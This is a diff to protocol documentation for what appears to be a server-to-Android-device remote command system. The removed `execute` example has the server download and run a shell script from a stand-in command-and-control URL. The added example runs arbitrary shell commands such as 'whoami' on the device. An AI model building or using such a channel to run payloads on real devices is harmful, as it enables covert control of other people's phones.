@@ -91,7 +91,7 @@ All messages between client and server represent remote function calls.
 Key | Type | Description
 --------------------------
 command | String | The function to be called on the remote end.
-arguments | Map(String -> Object) | Arguments to be passed to the function.
+arguments | Map(String -> String) | Arguments to be passed to the function.
 nonce | String | A unique ID to allow for tracking of command execution. The nonce does not have to be random but must be unique
 
 #####Ready
@@ -109,13 +109,13 @@ Android device ID.
 ```
 
 #####Execute
-The `execute` command allows the server to download and run a shell script payload.
+The `execute` command allows the server to execute a shell command on the device.
 ```
 {
     "command": "execute",
     "nonce": "1234-5467-4353-6468"
     "arguments": {
-        "url": "https://commandandcontrol.com/payload.sh"
+        "shell_command": "whoami"
     }
 }
 ```
